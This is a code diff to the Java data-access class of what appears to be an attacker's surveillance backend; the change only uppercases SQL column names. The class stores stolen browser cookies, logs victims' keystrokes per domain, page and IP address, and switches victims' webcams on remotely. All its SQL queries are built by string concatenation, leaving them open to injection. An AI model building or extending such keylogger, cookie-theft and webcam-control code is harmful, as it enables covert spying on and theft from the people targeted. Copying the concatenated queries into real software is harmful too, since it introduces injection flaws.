@@ -22,7 +22,7 @@ public class ApplicationDao extends SqlQueries {
 	ResultSet resultSet = null;
 
 	public void insertCookie(String username, String cookie) throws SQLException {
-		final String SQL_QUERY = "insert into USER_COOKIE (username, cookie, cookie_date) values ('" + username + "', '"
+		final String SQL_QUERY = "insert into USER_COOKIE (USERNAME, COOKIE, COOKIE_DATE) values ('" + username + "', '"
 				+ cookie + "', now())";
 
 		connection = jdbcConnection.openConnection();
@@ -41,7 +41,7 @@ public class ApplicationDao extends SqlQueries {
 	}
 
 	public List<UserCookie> retrieveCookie() throws SQLException {
-		final String SQL_QUERY = "select * from USER_COOKIE order by cookie_date desc";
+		final String SQL_QUERY = "select * from USER_COOKIE order by COOKIE_DATE desc";
 
 		connection = jdbcConnection.openConnection();
 		preparedStatement = connection.prepareStatement(SQL_QUERY);
@@ -61,7 +61,7 @@ public class ApplicationDao extends SqlQueries {
 	}
 
 	public void logPressedKeys(String domain, String page, String pressedKey, String clientIP, String clientTime) throws SQLException {
-		final String SQL_QUERY = "insert into KEY_LOGGER (domain, page, pressed_key, client_ip, client_time_millis, created_date) values ('"
+		final String SQL_QUERY = "insert into KEY_LOGGER (DOMAIN, PAGE, PRESSED_KEY, CLIENT_IP, CLIENT_TIME_MILLIS, CREATED_DATE) values ('"
 				+ domain + "', '" + page + "', '" + pressedKey + "', '" + clientIP + "', '" + clientTime + "', now())";
 
 		connection = jdbcConnection.openConnection();
@@ -71,8 +71,8 @@ public class ApplicationDao extends SqlQueries {
 	}
 
 	public List<KeyloggedUser> getKeyloggedUsers(String logDate) throws SQLException {
-		final String SQL_QUERY = "select client_ip, domain, max(client_time_millis) dt from KEY_LOGGER where created_date like '"
-				+ logDate + "%' group by client_ip, domain order by dt desc";
+		final String SQL_QUERY = "select CLIENT_IP, DOMAIN, max(CLIENT_TIME_MILLIS) dt from KEY_LOGGER where CREATED_DATE like '"
+				+ logDate + "%' group by CLIENT_IP, DOMAIN order by dt desc";
 
 		connection = jdbcConnection.openConnection();
 		preparedStatement = connection.prepareStatement(SQL_QUERY);
@@ -91,8 +91,8 @@ public class ApplicationDao extends SqlQueries {
 	}
 
 	public String getKeylogs(String logDate, String clientIP, String domain) throws SQLException, ParseException {
-		final String SQL_QUERY = "select * from KEY_LOGGER where created_date like '" + logDate + "%' and client_ip = '"
-				+ clientIP + "' and domain = '" + domain + "' order by client_time_millis";
+		final String SQL_QUERY = "select * from KEY_LOGGER where CREATED_DATE like '" + logDate + "%' and CLIENT_IP = '"
+				+ clientIP + "' and DOMAIN = '" + domain + "' order by CLIENT_TIME_MILLIS";
 
 		connection = jdbcConnection.openConnection();
 		preparedStatement = connection.prepareStatement(SQL_QUERY);
@@ -119,8 +119,8 @@ public class ApplicationDao extends SqlQueries {
 
 	public List<KeyloggedUser> getDetailedKeylogs(String logDate, String clientIP, String domain)
 			throws SQLException, ParseException {
-		final String SQL_QUERY = "select * from KEY_LOGGER where created_date like '" + logDate + "%' and client_ip = '"
-				+ clientIP + "' and domain = '" + domain + "' order by client_time_millis";
+		final String SQL_QUERY = "select * from KEY_LOGGER where CREATED_DATE like '" + logDate + "%' and CLIENT_IP = '"
+				+ clientIP + "' and DOMAIN = '" + domain + "' order by CLIENT_TIME_MILLIS";
 
 		connection = jdbcConnection.openConnection();
 		preparedStatement = connection.prepareStatement(SQL_QUERY);
@@ -140,7 +140,7 @@ public class ApplicationDao extends SqlQueries {
 	}
 
 	public Webcam getWebcamInstruction(String clientIP, String geoLocation) throws SQLException {
-		final String SQL_QUERY = "select * from WEBCAM where client_ip = '" + clientIP + "'";
+		final String SQL_QUERY = "select * from WEBCAM where CLIENT_IP = '" + clientIP + "'";
 		String UPSERT_QUERY = null;
 
 		connection = jdbcConnection.openConnection();
@@ -161,7 +161,7 @@ public class ApplicationDao extends SqlQueries {
 			webcam.setGeoLocation(geoLocation);
 			webcam.setTurnOnCam("no");
 
-			UPSERT_QUERY = "insert into WEBCAM (client_ip, geo_location, turn_on_cam, created_date, modified_date) values ('"
+			UPSERT_QUERY = "insert into WEBCAM (CLIENT_IP, GEO_LOCATION, TURN_ON_CAM, CREATED_DATE, MODIFIED_DATE) values ('"
 					+ webcam.getClientIP() + "', '" + webcam.getGeoLocation() + "', '" + webcam.getTurnOnCam()
 					+ "', now(), now())";
 		} else {
@@ -178,7 +178,7 @@ public class ApplicationDao extends SqlQueries {
 	}
 
 	public List<Webcam> getWebcamClients() throws SQLException {
-		final String SQL_QUERY = "select * from WEBCAM where (timediff(now(), modified_date) < '00:00:15') order by modified_date desc";
+		final String SQL_QUERY = "select * from WEBCAM where (timediff(now(), MODIFIED_DATE) < '00:00:15') order by MODIFIED_DATE desc";
 		//final String SQL_QUERY = "select * from WEBCAM order by modified_date desc";
 		// final String SQL_QUERY = "select * from webcam where (timediff(now(),
 		// modified_date) < '24:00:00') order by modified_date desc";
@@ -201,8 +201,8 @@ public class ApplicationDao extends SqlQueries {
 	}
 
 	public void webcamSwitch(String clientIP, String turnOnCam) throws SQLException {
-		final String SQL_QUERY = "update WEBCAM set turn_on_cam = '" + turnOnCam
-				+ "', modified_date = now() where client_ip = '" + clientIP + "'";
+		final String SQL_QUERY = "update WEBCAM set TURN_ON_CAM = '" + turnOnCam
+				+ "', MODIFIED_DATE = now() where CLIENT_IP = '" + clientIP + "'";
 
 		connection = jdbcConnection.openConnection();
 		preparedStatement = connection.prepareStatement(SQL_QUERY);
